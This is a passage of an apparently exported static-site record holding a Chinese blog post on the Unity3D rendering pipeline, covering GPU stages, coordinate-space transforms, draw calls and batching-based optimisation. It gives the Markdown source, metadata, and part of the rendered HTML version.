的数据.会将这些数据加载到系统内存(Random Access Memory,RAM).在 Unity3d 对应的类是 Mesh\n> * 2:准备数据,将设置的渲染状态也读进内存中.渲染状态定义了场景内的网格是怎样被渲染的.比如:设置顶点着色器/片元着色器,光源,材质,纹理等,动态修改渲染状态等.在 Unity3d 对应的类是 MeshRenderer\n> * 3:CPU 向 GPU 发送 DrawCall 命令,开始渲染.这个命令指向一个等待被渲染的图元列表(就是点线面数据,不包含渲染状态).GPU 会拿到渲染状态和图元列表进行渲染成像.在 Unity3d 里面被隐藏了细节,无法看到\n> * 其他知识:一般情况下,DrawCall命令,不应该频繁,unity 官方设定固定时间内 250 个以下.DrawCall命令指向的图元列表不应该过多,这个也是应该注意的.\n\n\n* 电脑GPU运行流程\n> * -->A:GPU 将对这些几何数据进行处理,会输出下一个阶段需要的信息.比如会将顶点坐标转换到屏幕空间中,输出一些二维顶点坐标,每个顶点对应的深度值,着色等信息.一般叫做\"几何阶段\",开启几何阶段\n>> * -->1:顶点着色器.(由顶点数据传入,传出顶点数据,这些数据可能被增加或者被删减).\n>> * -->2:曲面细分着色器\n>> * -->3:几何着色器\n>> * -->4:裁剪\n>> * -->5:屏幕映射\n> * -->B:将上一阶段生成的数据,用来生产屏幕上的像素,渲染出最终的图像.一般叫做\"光栅化阶段\",开启光栅化阶段\n>> * -->1:三角形设置\n>> * -->2:三角形遍历\n>> * -->3:片元着色器\n>> * -->4:逐片元操作\n> * -->C:生成最终的屏幕2D图像\n> * 其他知识:一般情况下,网格和纹理等数据会被加载到显卡上的存储空间,显存(Video Random Access Memory,VRAM),这是由于在显存上面读取数据比在内存读取数据渲染更快.\n\n\n# GPU渲染流程\n\n\n* 顶点数据-->顶点着色器-->曲面细分着色器-->几何着色器-->裁剪-->屏幕映射-->三角形设置-->三角形遍历-->片元着色器-->逐片元操作-->屏幕2D图像,屏幕 2d 图像也是可以表示三维立体感受的(主要靠脑补).\n> * A:开启几何阶段\n> * 1:顶点着色器(Vertex Shader)是完全可编程的,通常用于实现顶点的控件变换,顶点着色,坐标变换,逐顶点光照,后续阶段的数据等功能.输入进来的每个顶点都会调用一次顶点着色器,不可以创建或者销毁顶点,无法得到顶点与顶点之间的关系.(无法得知2 个顶点是否属于同一个三角网络),这样情况下,GPU 可以并行处理很多个顶点.必须完成的工作    \n> ***把顶点坐标从模型空间(本身空间)转换到齐次裁剪空间***        \n> 就是将一个三维坐标系中的点,变为一个立体正方形中的一个点,由硬件做透视除法之后,得到最终的归一化设备坐标(Normalized Device Coordinates,NDC)\n> ```\n>    o.pos = mul(UNITY_MVP,v.position);\n>    UnityObjectToClipPos(v.vertex);\n> ```\n> * 2:曲面细分着色器(Tessellation Shader)是一个可选的着色器,它用于细分图元.\n> * 3:几何着色器(Geometry Shader)同样是一个可选的着色器,它可以被用于执行逐图元的着色操作,或者被用于产生更多的图元.\n> * 4:裁剪(Clipping),这一阶段的目的是将那些不在摄像机视野内的顶点裁剪掉,并剔除某些三角图元的面片.这个阶段可以配置,不可以编程,比如:可以使用自定义的裁剪平面来配置裁剪区域,也可以通过指令控制裁剪三角图元的正面还是背面.     \n一个图元和摄像机视野的关系有 3 种,完全在视野内,部分在视野内,完全在视野外.部分在视野内的物体需要被裁剪.即在齐次裁剪空间里面,所有的顶点都被放入这个立方体内了,不在立方体内的映射,直接被裁剪掉,不会被渲染.\n> * 5:屏幕映射(Screen Mapping),不可以编程和配置,负责把每个图元的坐标转换到屏幕坐标系中.作用是从齐次裁剪的立方体内将三维坐标系x,y,z --> 变成二维坐标的 x,y.      \n这个地方需要理解屏幕坐标系(Screen Coordinates),这个是纯二维坐标系,对应的是立方体内的 x,y,那么 z 值跑哪里了?     \n屏幕坐标系和 z 坐标构成了窗口坐标系(Window Coordinates),z值参与了GPU的光栅化阶段.窗口里面的内容可以让人眼有明显的三维立体感受,而屏幕坐标系没有三维立体感受.z值参与了表示在三维立体感受中的物体距离屏幕坐标系有多远,也就是一个点距离一个面有多远,这个需要想象力\n> * B:开启光栅化阶段,接收上个阶段输出的数据(例如屏幕坐标系下的顶点位置,深度值(z坐标),法线方向,视角方向等数据),概览:计算每个图元覆盖了屏幕二维坐标系的哪些像素,以及为这些像素计算它们的颜色\n> * 6:三角形设置(Triangle Setup):固定函数,不可编程与配置.上个阶段我们得到的都是三角网格的顶点,即我们得到的是三角形的每条边的 2 个端点,根据这些数据计算三角形每条边的像素坐标,从而知道三角网格对像素的覆盖情况.       \n> * 7:三角形遍历(Triangle Traversal):固定函数,不可编程与配置.检查每个像素是否被一个三角网格所覆盖,如果这个像素被覆盖,就生成一个片元(fragment)对象.找到哪些像素被三角网格覆盖的过程就是三角形遍历,这个阶段也被称为扫描变换(Scan Conversion).     \n寻找过程中,会对整个覆盖区域的像素进行插值计算,得出深度值,最终输出一个片元对象.      \n片元对象不是像素,是数据的集合,包括屏幕坐标,深度信息,顶点信息,法线,颜色,纹理坐标uv等等.\n> * 8:片元着色器(Fragment Shader),完全可配置与编程.用于实现逐片元的着色操作.在DirectX中,被称为像素着色器(Pixel Shader).        \n得到的一些数据,是根据从顶点着色器中输出的数据插值得到的,最终输出是一个或者多个颜色值.       \n程序开发会修改插值得到的颜色,将顶点着色器输出的纹理坐标,对应片元的纹理坐标,进行颜色的修改等.\n> * 9:逐片元操作(Per-Fragment Operations),可配置,负责修改颜色,深度缓冲,混合等等.在DirectX中,被称为输出合并阶段(Output-Merger)).         \n主要工作是:     \n1):决定每个片元的可见性,深度测试(Depth Test),模板测试(Stencil Test),如果不通过测试,则放弃这个片元,测试的含义类似于闯关.这个地方的测试尤其重要.        \n模板测试-->拿到颜色缓冲区的参考值-->对比片元的参考值-->舍弃或者写入颜色缓冲区       \n深度测试-->拿到颜色缓冲区的深度值-->对比片元的深度值-->舍弃或者进入下一步-->是否开启深度写入-->舍弃或者写入颜色缓冲区        \n2):当你闯关成功,就会把片元的颜色值和已经存储在颜色缓冲区中的颜色进行合并,或者说是混合.      \n3)混合之后的颜色,写入颜色缓冲区中,当你进行渲染的时候,颜色缓冲区中已经有数据了,这次的颜色数据是覆盖颜色缓冲区的数据,还是进行合并融合,就是这一步需要做的事情.     \n4)为了避免我们看到正在进行光栅化的图元,GPU 使用了双重缓冲,前置缓冲区和后置缓冲区来回进行交换,因此保证了我们看到的图像总是连续的\n* 注意上面讲到的顺序,在不同平台可能排列不一致,这是因为图像编程的实现不太相同,也可能是GPU 做了很多优化.      \n\n# GPU渲染过程中的空间变换过程\n* 1:模型空间(model space),对象空间(object space)或者局部空间(local space),使用的左手坐标系,都表示当前你这个物体在自身坐标系下的空间.\n* 2:世界空间(world space)就是 global 空间,使用的左手坐标系,它建立了我们想象中的无限大空间,但是在程序中,是有限的,有界的.这个空间在我们正常交流中,可以指一个办公室,一座大楼,一座农场等等,它们才是玩家所能达到最大的场景,这叫做世界空间,也就是说一个办公室,一座大楼,一座农场就是世界空间.要理解这个,真的靠想象力.        \n世界空间的原点,就是游戏空间的中心点.我们可以把 unity 想象成一个树状图结构,有一个虚拟的根节点,根节点下有多个场景(在 Scenes In Build 中有很多可以打包的场景),这些场景又是一个节点,这个场景节点下面又有很多物体,就放在 Hierarchy 下面,可以把GameObject 的父节点认为是当前的这个场景.在Hierarchy 下面第一层的GameObject就是世界空间,第二层以及以后才是模型空间.       \n***第一步变换:将顶点坐标从模型空间变换到世界空间,叫做模型变换***\n* 3:观察空间(view space)也被成为摄像机空间(camera space),模型空间中的特殊空间,使用的右手坐标系,这是一个三维空间.而屏幕空间是一个二维空间,采用的是人的脑补才出现的三维空间.      \n***第二步变换:将顶点坐标从世界空间变换到观察空间,叫做观察变换***\n*  4:裁剪空间(clip space)也被称为齐次裁剪空间,使用的矩阵叫做裁剪矩阵(clip matrix),也叫做投影矩阵(projection matrix),作用是对渲染图元进行裁剪,位于空间内部的图元会被保留,位于外部的被剔除,与这块空间边界相交的图元会被裁剪,这块空间由摄像机的视椎体决定.视椎体有 6 个平面,被称为裁剪平面(clip plans).     \n***第三步变换:将顶点坐标从观察空间变换到裁剪空间,叫做裁剪变换***\n*  5:屏幕空间(screen space)需要经过真正的投影.需要进行标准齐次除法(homogeneous division),在 openGL 中被称为归一化设备坐标(Normalized Device Coordinates,NDC),经过这个步骤之后,裁剪空间变成了立方体空间,之前是梯形空间.通过映射算法,直接映射在屏幕上面. \n***第四步变换:将顶点坐标从裁剪空间映射到屏幕空间***\n* 6:总结,       \n模型空间--->模型变换--->世界空间--->观察变换--->观察空间--->投影变换--->裁剪空间--->屏幕映射--->屏幕空间       \n将模型变换,观察变换以及投影变换串联成一个矩阵,即 MVP 矩阵,用于将顶点从模型空间中转换到裁剪空间中.\n\n\n# Draw Call \n* 1:draw call 本身的含义很简单.就是 CPU 调用图像编程接口,命令 GPU 进行渲染的操作.接口命令的例子:OpenGL 中的 glDrawElements 命令或者 DirectX 中的 DrawIndexedPrimitive 命令.\n* 2:我们需要让 CPU 以及 GPU 并行工作,以提高效率,就产生了一个命令缓冲区(Command Buffer).命令缓冲区包含了一个命令队列,由 CPU 向里面添加命令,GPU 从中读取命令,添加和读取的过程是相互独立的.先进先出模式,CPU 生产,GPU 消费.\n* 3:命令缓冲区里面不止draw call一种命令,还有改变渲染状态的命令(更加耗时).\n* 4:如果频繁调用 draw call,CPU就会向 GPU 发送很多内容,包括数据,状态和命令,检查渲染状态等.如果draw call太多,CPU 就会花费大量时间在上面,造成 CPU 过载,影响帧率.\n* 5:优化draw call,就是将相同渲染状态的网格,合并成一个大的网格,提交一次即可.这就是批处理(Batching)的方法.一般情况下静态批处理很好做,动态批处理也会合并,但是因为物体是在不断运动的,所以每帧都会有合批,这对 CPU 是一种压榨性能的操作.避免使用大量很小的网格,非要用,考虑合批.尽量使用相同的材质(同一渲染状态).\n\n# 渲染优化\n* 影响性能的因素有哪些?\n> **A**:CPU 中过多的 draw call ,复杂的脚本或者物理模拟      \n> **B**:GPU 顶点处理:过多的顶点,过多的逐顶点计算.片元处理,过多的片元(即可能是由于分辨率造成的,也可能是由于 overdraw 造成的),过多的逐片元计算.       \n> **C**:带宽,也就是 CPU 向 GPU 提交 draw call 命令携带的数据需要一个通道送给 GPU,这条通道就是带宽.CPU 在每次通知 GPU 进行渲染之前,都需要提前准备好顶点数据(如:位置,法线,颜色,纹理坐标等),然后调用一系列 API 把它们放到 GPU 可以访问到的指定位置,最后,调用一个绘制命令(会改变很多渲染状态的设置),来告诉 GPU 进行渲染.调用时会产生一个 draw call ,过多的 draw call 或者 一次 draw call 的数据量过大,都会导致 CPU 将大部分时间都花费在提交 draw call 的工作上面.       \n> **D**:填充率, 降低显示分辨率并运行游戏。如果较低的显示分辨率使游戏运行得更快，你可能会受到GPU填充率的限制。       \n* 优化手段\n> 1:CPU 使用(动态,静态)批处理降低 draw call     \n> 2:GPU 让美术同学降低顶点,有时候 GPU 会将一个顶点拆成多个顶点,原因是分离纹理坐标(uv splits)或者产生平滑的边界(smoothing splits),优化建议:尽可能移除不必要的硬边以及纹理衔接,避免边界平滑和纹理分离.减少模型面数,使用 LOD 技术减少顶点数,模型离摄像机很远时,减少模型上面的面数.        \n> 3:GPU 程序方面减少需要处理的顶点数目,优化几何体,使用模型的 LOD(Level of Detail)技术.使用遮挡剔除(Occlusion Culling)技术       \n> 4:减少需要处理的片元数目,在于减少overdraw,就是同一个像素被绘制了多次.控制绘制程序,避免使用半透明队列,时刻警惕透明物体,减少实时光照.      \n> 5:在 shader 中减少计算复杂度,不要使用 分支语句与循环语句,避免使用 sin,tan,pow,log 等数学运算,使用查找表来作为代替,不要使用 discard 操作.使用 Shader 的 LOD(Level of Detail)技术,只有 shader 的 LOD 值小于某个设定的值,这个 shader 才会被使用,而使用了那些超过设定值的 shader 的物体将不会被渲染.       \n> 6:图片设置,减小纹理大小,尽量小于 1024x1024,长宽值最好是 2 的整数幂.       \n> 7:使用 渲染统计窗口 Rendering Statistics Window,性能分析器(Profiler),以及帧调试器(Frame Debugger)     \n* 用好工具\n> 1:渲染统计窗口 Rendering Statistics Window\n>> Graphic 的右侧显示了 FPS 数目以及毫秒数.毫秒数表示处理和渲染一帧所需的时间.FPS 表示一段时间内的平均值。平均 FPS = 帧数 / 一段时长。帧数可以用每次进入 Update 时加一的变量来统计。一段时长就是进入 Update 时 Time.deltaTime 的累加因为是平均值，所以当时间越长时，这个值才是稳定的。一般情况是在 Update 记录时长与调用次数,用调用次数/记录时长=FPS,如果记录时长=1秒则表示每秒多少帧.每秒 60 帧是非常好的,现在手游基本保持在每秒 30 帧以上的标准.用记录时长 * 1000 表示毫秒数,记录时长 * 1000 / 调用次数,表示多少毫秒每帧.如果记录时长=1秒,则一帧所用时长为 1000 / 调用次数 毫秒.稳定情况下 16.6ms一帧 是非常好的,不需要优化的,如果达到了 33ms每帧 则需要进行优化了.因为 33ms每帧 则一秒才有30帧,显然是需要优化的.(https://www.freesion.com/article/1005726774/)               \n>> batches 一帧中需要进行批处理的数目,官方建议低于 250 个.      \n>>Saved By Batching 合并的批处理数目,这个数字表明了批处理为我们节省了多少 Draw Call     \n>> Tris 和 Verts 表示需要绘制的三角面片(官方建议在手机上低于200K面)与顶点数目(官方建议在手机上低于100K 个顶点)       \n>> Screen 屏幕的大小以及它占用的内存大小        \n>> SetPass 渲染使用的 Pass 的数目,每个 Pass 都需要 Unity 的 runtime 来绑定一个新的 shader ,这可能造成 CPU 的瓶颈        \n>> Visible Skinned Meshes 渲染蒙皮网格的数目        \n>> Animations 播放的动画数目        \n\n> 2: 性能分析器(Profiler)\n>> Rendering 里面展示了很详细的信息.        \n\n> 3:帧调试器(Frame Debugger)\n>>可以得到 unity 是如何渲染当前帧的\n* 批处理\n> 1:静态批处理:自由度高,限制很少,需要共享同一材质.缺点是占用更多的内存,经过静态批处理的物体都不可以移动了,即时在脚本里面尝试改变物体的位置.如果在静态批处理前一些物体共享了相同的网格,那么再内存中每一个物体都会对应一个该网格的复制品,即一个网格会变成多个网格再发送给 GPU,如果有 1000 个相同网格的模型,就会多出 1000 倍的内存.在内存上面 VBO total 会变大.\n\n> 2:动态批处理:优点是一切处理都是 unity 自动完成的,不需要我们自己做任何操作,而且物体是可以移动的,但缺点是限制很多,需要相同的渲染状态,CPU 压力大.原理是每一帧把可以进行批处理的模型网格进行合并,再把合并后的模型数据传递给 GPU,然后使用同一个材质对齐渲染,因为是每帧都在合并,所以物体可以移动.要保证相同材质,相同 shader,相同缩放,相同顶点.测试:在一个空场景把所有运动的模型导入,让其运动,然后测试 draw call 是否是一个,Save By Baching 的数目是否大于 0,这种就是动态合批了.\n","slug":"Renderer/渲染基本流程","published":1,"updated":"2020-06-08T13:29:34.148Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cy9000x2gk72nttb8g9","content":"<h1 id=\"基本流程\"><a href=\"#基本流程\" class=\"headerlink\" title=\"基本流程\"></a>基本流程</h1><ul>\n<li>开发准备流程<blockquote>\n<ul>\n<li>1:搭建场景,添加摄像机,添加光源,设置摄像机,设置光源.</li>\n<li>2:剔除无需渲染的物体,包括不限于 2D 物体,3D 物体 </li>\n<li>3:设置物体的渲染状态,包括不限于设置材质,纹理,shader 等</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<ul>\n<li>电脑 CPU 运行流程<blockquote>\n<ul>\n<li>1:准备数据,上面开发准备流程最后会在CPU中生成几何信息,一般叫做”渲染图元”,几何信息就是 点,线,面 的数据.会将这些数据加载到系统内存(Random Access Memory,RAM).在 Unity3d 对应的类是 Mesh</li>\n<li>2:准备数据,将设置的渲染状态也读进内存中.渲染状态定义了场景内的网格是怎样被渲染的.比如:设置顶点着色器/片元着色器,光源,材质,纹理等,动态修改渲染状态等.在 Unity3d 对应的类是 MeshRenderer</li>\n<li>3:CPU 向 GPU 发送 DrawCall 命令,开始渲染.这个命令指向一个等待被渲染的图元列表(就是点线面数据,不包含渲染状态).GPU 会拿到渲染状态和图元列表进行渲染成像.在 Unity3d 里面被隐藏了细节,无法看到</li>\n<li>其他知识:一般情况下,DrawCall命令,不应该频繁,unity 官方设定固定时间内 250 个以下.DrawCall命令指向的图元列表不应该过多,这个也是应该注意的.</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<ul>\n<li>电脑GPU运行流程<blockquote>\n<ul>\n<li>–&gt;A:GPU 将对这些几何数据进行处理,会输出下一个阶段需要的信息.比如会将顶点坐标转换到屏幕空间中,输出一些二维顶点坐标,每个顶点对应的深度值,着色等信息.一般叫做”几何阶段”,开启几何阶段<blockquote>\n<ul>\n<li>–&gt;1:顶点着色器.(由顶点数据传入,传出顶点数据,这些数据可能被增加或者被删减).</li>\n<li>–&gt;2:曲面细分着色器</li>\n<li>–&gt;3:几何着色器</li>\n<li>–&gt;4:裁剪</li>\n<li>–&gt;5:屏幕映射</li>\n</ul>\n</blockquote>\n</li>\n<li>–&gt;B:将上一阶段生成的数据,用来生产屏幕上的像素,渲染出最终的图像.一般叫做”光栅化阶段”,开启光栅化阶段<blockquote>\n<ul>\n<li>–&gt;1:三角形设置</li>\n<li>–&gt;2:三角形遍历</li>\n<li>–&gt;3:片元着色器</li>\n<li>–&gt;4:逐片元操作</li>\n</ul>\n</blockquote>\n</li>\n<li>–&gt;C:生成最终的屏幕2D图像</li>\n<li>其他知识:一般情况下,网格和纹理等数据会被加载到显卡上的存储空间,显存(Video Random Access Memory,VRAM),这是由于在显存上面读取数据比在内存读取数据渲染更快.</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h1 id=\"GPU渲染流程\"><a href=\"#GPU渲染流程\" class=\"headerlink\" title=\"GPU渲染流程\"></a>GPU渲染流程</h1><ul>\n<li>顶点数据–&gt;顶点着色器–&gt;曲面细分着色器–&gt;几何着色器–&gt;裁剪–&gt;屏幕映射–&gt;三角形设置–&gt;三角形遍历–&gt;片元着色器–&gt;逐片元操作–&gt;屏幕2D图像,屏幕 2d 图像也是可以表示三维立体感受的(主要靠脑补).<blockquote>\n<ul>\n<li>A:开启几何阶段</li>\n<li>1:顶点着色器(Vertex Shader)是完全可编程的,通常用于实现顶点的控件变换,顶点着色,坐标变换,逐顶点光照,后续阶段的数据等功能.输入进来的每个顶点都会调用一次顶点着色器,不可以创建或者销毁顶点,无法得到顶点与顶点之间的关系.(无法得知2 个顶点是否属于同一个三角网络),这样情况下,GPU 可以并行处理很多个顶点.必须完成的工作    </li>\n<li><strong>把顶点坐标从模型空间(本身空间)转换到齐次裁剪空间*</strong><br>就是将一个三维坐标系中的点,变为一个立体正方形中的一个点,由硬件做透视除法之后,得到最终的归一化设备坐标(Normalized Device Coordinates,NDC)<pre><code>  o.pos = mul(UNITY_MVP,v.position);\n  UnityObjectToClipPos(v.vertex);</code></pre></li>\n<li>2:曲面细分着色器(Tessellation Shader)是一个可选的着色器,它用于细分图元.</li>\n<li>3:几何着色器(Geometry Shader)同样是一个可选的着色器,它可以被用于执行逐图元的着色操作,或者被用于产生更多的图元.</li>\n<li>4:裁剪(Clipping),这一阶段的目的是将那些不在摄像机视野内的顶点裁剪掉,并剔除某些三角图元的面片.这个阶段可以配置,不可以编程,比如:可以使用自定义的裁剪平面来配置裁剪区域,也可以通过指令控制裁剪三角图元的正面还是背面.<br>一个图元和摄像机视野的关系有 3 种,完全在视野内,部分在视野内,完全在视野外.部分在视野内的物体需要被裁剪.即在齐次裁剪空间里面,所有的顶点都被放入这个立方体内了,不在立方体内的映射,直接被裁剪掉,不会被渲染.</li>\n<li>5:屏幕映射(Screen Mapping),不可以编程和配置,负责把每个图元的坐标转换到屏幕坐标系中.作用是从齐次裁剪的立方体内将三维坐标系x,y,z –&gt; 变成二维坐标的 x,y.<br>这个地方需要理解屏幕坐标系(Screen Coordinates),这个是纯二维坐标系,对应的是立方体内的 x,y,那么 z 值跑哪里了?<br>屏幕坐标系和 z 坐标构成了窗口坐标系(Window Coordinates),z值参与了GPU的光栅化阶段.窗口里面的内容可以让人眼有明显的三维立体感受,而屏幕坐标系没有三维立体感受.z值参与了表示在三维立体感受中的物体距离屏幕坐标系有多远,也就是一个点距离一个面有多远,这个需要想象力</li>\n<li>B:开启光栅化阶段,接收上个阶段输出的数据(例如屏幕坐标系下的顶点位置,深度值(z坐标),法线方向,视角方向等数据),概览:计算每个图元覆盖了屏幕二维坐标系的哪些像素,以及为这些像素计算它们的颜色</li>\n<li>6:三角形设置(Triangle Setup):固定函数,不可编程与配置.上个阶段我们得到的都是三角网格的顶点,即我们得到的是三角形的每条边的 2 个端点,根据这些数据计算三角形每条边的像素坐标,从而知道三角网格对像素的覆盖情况.       </li>\n<li>7:三角形遍历(Triangle Traversal):固定函数,不可编程与配置.检查每个像素是否被一个三角网格所覆盖,如果这个像素被覆盖,就生成一个片元(fragment)对象.找到哪些像素被三角网格覆盖的过程就是三角形遍历,这个阶段也被称为扫描变换(Scan Conversion).<br>寻找过程中,会对整个覆盖区域的像素进行插值计算,得出深度值,最终输出一个片元对象.<br>片元对象不是像素,是数据的集合,包括屏幕坐标,深度信息,顶点信息,法线,颜色,纹理坐标uv等等.</li>\n<li>8:片元着色器(Fragment Shader),完全可配置与编程.用于实现逐片元的着色操作.在DirectX中,被称为像素着色器(Pixel Shader).<br>得到的一些数据,是根据从顶点着色器中输出的数据插值得到的,最终输出是一个或者多个颜色值.<br>程序开发会修改插值得到的颜色,将顶点着色器输出的纹理坐标,对应片元的纹理坐标,进行颜色的修改等.</li>\n<li>9:逐片元操作(Per-Fragment Operations),可配置,负责修改颜色,深度缓冲,混合等等.在DirectX中,被称为输出合并阶段(Output-Merger)).<br>主要工作是:<br>1):决定每个片元的可见性,深度测试(Depth Test),模板测试(Stencil Test),如果不通过测试,则放弃这个片元,测试的含义类似于闯关.这个地方的测试尤其重要.<br>模板测试–&gt;拿到颜色缓冲区的参考值–&gt;对比片元的参考值–&gt;舍弃或者写入颜色缓冲区<br>深度测试–&gt;拿到颜色缓冲区的深度值–&gt;对比片元的深度值–&gt;舍弃或者进入下一步–&gt;是否开启深度写入–&gt;舍弃或者写入颜色缓冲区<br>2):当你闯关成功,就会把片元的颜色值和已经存储在颜色缓冲区中的颜色进行合并,或者说是混合.<br>3)混合之后的颜色,写入颜色缓冲区中,当你进行渲染的时候,颜色缓冲区中已经有数据了,这次的颜色数据是覆盖颜色缓冲区的数据,还是进行合并融合,就是这一步需要做的事情.<br>4)为了避免我们看到正在进行光栅化的图元,GPU 使用了双重缓冲,前置缓冲区和后置缓冲区来回进行交换,因此保证了我们看到的图像总是连续的</li>\n</ul>\n</blockquote>\n</li>\n<li>注意上面讲到的顺序,在不同平台可能排列不一致,这是因为图像编程的实现不太相同,也可能是GPU 做了很多优化.      </li>\n</ul>\n<h1 id=\"GPU渲染过程中的空间变换过程\"><a href=\"#GPU渲染过程中的空间变换过程\" class=\"headerlink\" title=\"GPU渲染过程中的空间变换过程\"></a>GPU渲染过程中的空间变换过程</h1><ul>\n<li>1:模型空间(model space),对象空间(object space)或者局部空间(local space),使用的左手坐标系,都表示当前你这个物体在自身坐标系下的空间.</li>\n<li>2:世界空间(world space)就是 global 空间,使用的左手坐标系,它建立了我们想象中的无限大空间,但是在程序中,是有限的,有界的.这个空间在我们正常交流中,可以指一个办公室,一座大楼,一座农场等等,它们才是玩家所能达到最大的场景,这叫做世界空间,也就是说一个办公室,一座大楼,一座农场就是世界空间.要理解这个,真的靠想象力.<br>世界空间的原点,就是游戏空间的中心点.我们可以把 unity 想象成一个树状图结构,有一个虚拟的根节点,根节点下有多个场景(在 Scenes In Build 中有很多可以打包的场景),这些场景又是一个节点,这个场景节点下面又有很多物体,就放在 Hierarchy 下面,可以把GameObject 的父节点认为是当前的这个场景.在Hierarchy 下面第一层的GameObject就是世界空间,第二层以及以后才是模型空间.       </li>\n<li><strong>第一步变换:将顶点坐标从模型空间变换到世界空间,叫做模型变换*</strong></li>\n<li>3:观察空间(view space)也被成为摄像机空间(camera space),模型空间中的特殊空间,使用的右手坐标系,这是一个三维空间.而屏幕空间是一个二维空间,采用的是人的脑补才出现的三维空间.      </li>\n<li><strong>第二步变换:将顶点坐标从世界空间变换到观察空间,叫做观察变换*</strong></li>\n<li>4:裁剪空间(clip space)也被称为齐次裁剪空间,使用的矩阵叫做裁剪矩阵(clip matrix),也叫做投影矩阵(projection matrix),作用是对渲染图元进行裁剪,位于空间内部的图元会被保留,位于外部的被剔除,与这块空间边界相交的图元会被裁剪,这块空间由摄像机的视椎体决定.视椎体有 6 个平面,被称为裁剪平面(clip plans).     </li>\n<li><strong>第三步变换:将顶点坐标从观察空间变换到裁剪空间,叫做裁剪变换*</strong></li>\n<li>5:屏幕空间(screen space)需要经过真正的投影.需要进行标准齐次除法(homogeneous division),在 openGL 中被称为归一化设备坐标(Normalized Device Coordinates,NDC),经过这个步骤之后,裁剪空间变成了立方体空间,之前是梯形空间.通过映射算法,直接映射在屏幕上面. </li>\n<li><strong>第四步变换:将顶点坐标从裁剪空间映射到屏幕空间*</strong></li>\n<li>6:总结,<br>模型空间—&gt;模型变换—&gt;世界空间—&gt;观察变换—&gt;观察空间—&gt;投影变换—&gt;裁剪空间—&gt;屏幕映射—&gt;屏幕空间<br>将模型变换,观察变换以及投影变换串联成一个矩阵,即 MVP 矩阵,用于将顶点从模型空间中转换到裁剪空间中.</li>\n</ul>\n<h1 id=\"Draw-Call\"><a href=\"#Draw-Call\" class=\"headerlink\" title=\"Draw Call\"></a>Draw Call</h1><ul>\n<li>1:draw call 本身的含义很简单.就是 CPU 调用图像编程接口,命令 GPU 进行渲染的操作.接口命令的例子:OpenGL 中的 glDrawElements 命令或者 DirectX 中的 DrawIndexedPrimitive 命令.</li>\n<li>2:我们需要让 CPU 以及 GPU 并行工作,以提高效率,就产生了一个命令缓冲区(Command Buffer).命令缓冲区包含了一个命令队列,由 CPU 向里面添加命令,GPU 从中读取命令,添加和读取的过程是相互独立的.先进先出模式,CPU 生产,GPU 消费.</li>\n<li>3:命令缓冲区里面不止draw call一种命令,还有改变渲染状态的命令(更加耗时).</li>\n<li>4:如果频繁调用 draw call,CPU就会向 GPU 发送很多内容,包括数据,状态和命令,检查渲染状态等.如果draw call太多,CPU 就会花费大量时间在上面,造成 CPU 过载,影响帧率.</li>\n<li>5:优化draw call,就是将相同渲染状态的网格,合并成一个大的网格,提交一次即可.这就是批处理(Batching)的方法.一般情况下静态批处理很好做,动态批处理也会合并,但是因为物体是在不断运动的,所以每帧都会有合批,这对 CPU 是一种压榨性能的操作.避免使用大量很小的网格,非要用,考虑合批.尽量使用相同的材质(同一渲染状态).</li>\n</ul>\n<h1 id=\"渲染优化\"><a href=\"#渲染优化\" class=\"headerlink\" title=\"渲染优化\"></a>渲染优化</h1><ul>\n<li>影响性能的因素有哪些?<blockquote>\n<p><strong>A</strong>:CPU 中过多的 draw call ,复杂的脚本或者物理模拟<br><strong>B</strong>:GPU 顶点处理:过多的顶点,过多的逐顶点计算.片元处理,过多的片元(即可能是由于分辨率造成的,也可能是由于 overdraw 造成的),过多的逐片元计算.<br><strong>C</strong>:带宽,也就是 CPU 向 GPU 提交 draw call 命令携带的数据需要一个通道送给 GPU,这条通道就是带宽.CPU 在每次通知 GPU 进行渲染之前,都需要提前准备好顶点数据(如:位置,法线,颜色,纹理坐标等),然后调用一系列 API 把它们放到 GPU 可以访问到的指定位置,最后,调用一个绘制命令(会改变很多渲染状态的设置),来告诉 GPU 进行渲染.调用时会产生一个 draw call ,过多的 draw call 或者 一次 draw call 的数据量过大,都会导致 CPU 将大部分时间都花费在提交 draw call 的工作上面.<br><strong>D</strong>:填充率, 降低显示分辨率并运行游戏。如果较低的显示分辨率使游戏运行得更快，你可能会受到GPU填充率的限制。       </p>\n</blockquote>\n</li>\n<li>优化手段<blockquote>\n<p>1:CPU 使用(动态,静态)批处理降低 draw call<br>2:GPU 让美术同学降低顶点,有时候 GPU 会将一个顶点拆成多个顶点,原因是分离纹理坐标(uv splits)或者产生平滑的边界(smoothing splits),优化建议:尽可能移除不必要的硬边以及纹理衔接,避免边界平滑和纹理分离.减少模型面数,使用 LOD 技术减少顶点数,模型离摄像机很远时,减少模型上面的面数.<br>3:GPU 程序方面减少需要处理的顶点数目,优化几何体,使用模型的 LOD(Level of Detail)技术.使用遮挡剔除(Occlusion Culling)技术<br>4:减少需要处理的片元数目,在于减少overdraw,就是同一个像素被绘制了多次.控制绘制程序,避免使用半透明队列,时刻警惕透明物体,减少实时光照.<br>5:在 shader 中减少计算复杂度,不要使用 分支语句与循环语句,避免使用 sin,tan,pow,log 等数学运算,使用查找表来作为代替,不要使用 discard 操作.使用 Shader 的 LOD(Level of Detail)技术,只有 shader 的 LOD 值小于某个设定的值,这个 shader 才会被使用,而使用了那些超过设定值的 shader 的物体将不会被渲染.<br>6:图片设置,减小纹理大小,尽量小于 1024x1024,长宽值最好是 2 的整数幂.<br>7:使用 渲染统计窗口 Rendering Statistics Window,性能分析器(Profiler),以及帧调试器(Frame Debugger)     </p>\n</blockquote>\n</li>\n<li>用好工具<blockquote>\n<p>1:渲染统计窗口 Rendering Statistics Window</p>\n<blockquote>\n<p>Graphic 的右侧显示了 FPS 数目以及毫秒数.毫秒数表示处理和渲染一帧所需的时间.FPS 表示一段时间内的平均值。平均 FPS = 帧数 / 一段时长。帧数可以用每次进入 Update 时加一的变量来统计。一段时长就是进入 Update 时 Time.deltaTime 的累加因为是平均值，所以当时间越长时，这个值才是稳定的。一般情况是在 Update 记录时长与调用次数,用调用次数/记录时长=FPS,如果记录时长=1秒则表示每秒多少帧.每秒 60 帧是非常好的,现在手游基本保持在每秒 30 帧以上的标准.用记录时长 * 1000 表示毫秒数,记录时长 * 1000 / 调用次数,表示多少毫秒每帧.如果记录时长=1秒,则一帧所用时长为 1000 / 调用次数 毫秒.稳定情况下 